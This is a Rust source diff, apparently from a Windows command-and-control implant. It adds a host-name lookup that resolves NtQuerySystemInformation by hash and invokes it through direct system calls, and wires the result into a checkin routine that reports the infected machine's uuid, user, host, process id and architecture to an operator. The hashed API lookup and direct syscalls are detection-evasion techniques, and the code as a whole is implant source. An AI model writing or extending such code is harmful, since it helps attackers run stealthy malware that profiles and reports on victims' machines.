@@ -16,6 +16,54 @@ use winapi::ctypes::c_void;
 use std::ffi::OsString;
 use std::os::windows::ffi::OsStringExt;
 
+use winapi::shared::ntdef::{UNICODE_STRING, WCHAR};
+
+
+#[repr(C)]
+struct SYSTEM_COMPUTER_NAME_INFORMATION {
+    Name: UNICODE_STRING,
+}
+
+pub fn get_hostname_syscall() -> Option<String> {
+    unsafe {
+        let hash = crc32h("NtQuerySystemInformation");
+        let mut syscall = NtSyscall::default();
+        if !fetch_nt_syscall(hash, &mut syscall) {
+            return None;
+        }
+        SetSSn(syscall.dw_ssn as u16, syscall.p_syscall_inst_address);
+
+        let mut buffer = [0u16; 256];
+        let mut unicode = UNICODE_STRING {
+            Length: 0,
+            MaximumLength: (buffer.len() * 2) as u16,
+            Buffer: buffer.as_mut_ptr() as *mut WCHAR,
+        };
+
+        let mut info = SYSTEM_COMPUTER_NAME_INFORMATION { Name: unicode };
+
+        let status: NTSTATUS = RunSyscall(
+            112u32 as usize as *mut c_void,                                // SystemComputerNameInformation
+            &mut info as *mut _ as *mut c_void,                            // Output buffer
+            std::mem::size_of::<SYSTEM_COMPUTER_NAME_INFORMATION>() as usize as *mut c_void, // Buffer size
+            ptr::null_mut(),                                               // ReturnLength
+            ptr::null_mut(), ptr::null_mut(),
+            ptr::null_mut(), ptr::null_mut(),
+            ptr::null_mut(), ptr::null_mut(),
+            ptr::null_mut(),
+        );
+
+        if status != 0 || info.Name.Length == 0 {
+            return None;
+        }
+
+        let hostname = OsString::from_wide(std::slice::from_raw_parts(
+            info.Name.Buffer,
+            (info.Name.Length / 2) as usize,
+        ));
+        Some(hostname.to_string_lossy().into_owned())
+    }
+}
 
 fn get_pid_via_syscall() -> u32 {
     unsafe {
@@ -147,7 +195,7 @@ pub fn checkin() {
         "uuid": *config::UUID,
         "os": "windows",
         "user": get_current_username_syscall_direct().unwrap_or_else(|_| "Unknown".to_string()),
-        "host": "COMMANDO",
+        "host": get_hostname_syscall().unwrap_or_else(|| "Unknown".to_string()),
         "pid": get_pid_via_syscall(),
         "architecture": "x64"
     });
